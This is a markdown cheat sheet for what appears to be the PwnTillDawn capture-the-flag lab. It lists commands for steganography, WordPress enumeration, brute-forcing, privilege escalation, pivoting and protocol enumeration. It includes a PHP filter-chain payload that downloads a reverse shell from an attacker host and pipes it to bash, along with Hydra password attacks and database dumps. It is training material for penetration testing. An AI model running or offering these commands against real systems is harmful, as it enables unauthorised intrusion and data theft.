
# Pwntilldawn FULL Mindmap

## Steganography
- [Aperisolve](https://www.aperisolve.com/)
- [Stereogram Solver](https://piellardj.github.io/stereogram-solver/)
- **Steghide**: `steghide extract -sf screen.jpeg`
- **Depixelize**
    - **Depix**: `python3 depix.py -p pixel_image -s images/searchimages/image.png`
    - **Unredactor**

## Web Exploitation
- **Wordpress**
    - User enumeration: `wpscan --url url --enumerate u`
    - Check vulnerable templates/plugins: `wpscan --url url --enumerate vp,vt`
    - Bruteforce: `wpscan --url url_wordpress --passwords wordlist`
    - Example: `wpscan --url https://www.hackinprovence.fr/ -e u`
- **PHP Filters**
    - Code injection: 
      ```python
      python3 script.py --chain '<?= `wget attack_ip/revshell|bash`?>'
      ```
      - [PHP Filter Chain Generator](https://github.com/synacktiv/php_filter_chain_generator/blob/main/php_filter_chain_generator.py)
- **Enumeration**
    - **Path Enumeration**
        - **Dirsearch**
        - **FeroxBuster**:
            - Basic scan: `feroxbuster -u url -w ~/Desktop/SecLists-master/Discovery/Web-Content/common.txt --filter-status 404`
            - Advanced scan: `feroxbuster -u http://example.com -w wordlist -x php,html,txt -v -o output.txt --filter-status 404`
- **Bruteforce Forms**
    - **Hydra**:
      ```bash
      hydra -l admin -P SecLists-master/rockyou.txt 10.150.150.38 -s 30609 -t 20 http-post-form "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in:Invalid username or password"
      ```

## Privilege Escalation
- **Metasploit**
    - `msfconsole`
        - Local exploit suggester: `multi/recon/local_exploit_suggester`
    - Upgrade session: `sessions -u <id>`
- **Searchsploit**
    - Usage: `searchsploit xxxx`
    - Extract exploit: `searchsploit -m chemin`
- **Linpeas**
    - Hosting HTTP server: `sudo python3 -m http.server port` (attacker) and then wget on victim
- **SUID**: `find / -perm -u=s -type f 2>/dev/null`
- **Symbolic Link Exploit**: `ln -s /root /home/michael/important_files/root_backup`
- **LXC/LXD Privilege Escalation**
    - [LXC/LXD Privilege Escalation](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation)
- **Windows Escalation**
    - **Shell upgrade**:
      - `sessions -u id`
      - Migrate process: `ps --> migrate pid`
    - **Metasploit**:
      - Local exploit suggester: `multi/recon/local_exploit_suggester`

## Finding Flags
- **Linux**
    - `find ./* | grep FLAG3`
    - `find / -name FLAG6.txt 2>/dev/null`
    - `find / -type f -name 'FLAG[0-9][0-9]' 2>/dev/null`
    - `find / -type f -name 'FLAG[0-9].txt' 2>/dev/null`
- **Windows**
    - `@for /r C:\ %i in (FLAG??.txt) do @echo %i && @type "%i"`

## Miscellaneous
- Redirect errors to file: `2>fichier` then use `cat fichier`
- **Dumb Shell Upgrade**:
    - Python: `python -c 'import pty; pty.spawn("/bin/bash")'`
    - Python 3: `python3 -c 'import pty; pty.spawn("/bin/bash")'`
- **Netstat**: `netstat -antup`

## Protocols
- **FTP**
    - Verify anonymous login
- **NFS**
    - Show mounts: `showmount -e IP`
    - RPC info: `rpcinfo IP`
    - Mount: `sudo mount -t nfs ip:/remote /local`
    - Unmount: `sudo umount 10.150.150.59:/nfsroot`
- **SSH**
    - Test connection to check banner
    - Connect with private key: `ssh -i id_rsa user@ip`
- **DNS**
    - AXFR: `dig @mortysserver.com mortysserver.com axfr`
    - Edit `/etc/hosts` if needed:
      ```plaintext
      10.150.150.57 rickscontrolpanel.mortysserver.com
      ```
- **MySQL**
    - Connect: `mysql -h localhost -u sql_user -p`
    - Dump all databases: `mysqldump -u root -p --all-databases > alldb.sql`

## NMAP
- Basic scan: `nmap -sV -sC -T5 -p- ip`
- SYN scan: `sudo nmap -sF -p1-100 -T4`

## Pivoting / Tunneling
- **Check for services listening on localhost**: `netstat -antup`
- **Tunneling & Port Forwarding**
    - If SSH access is available: `sshuttle -r user@ip -N`
    - Web service on localhost:
      - Victim: `./chisel client ip_host:7777 R:8080:127.0.0.1:8080`
      - Host: `chisel server -port 7777 --reverse`
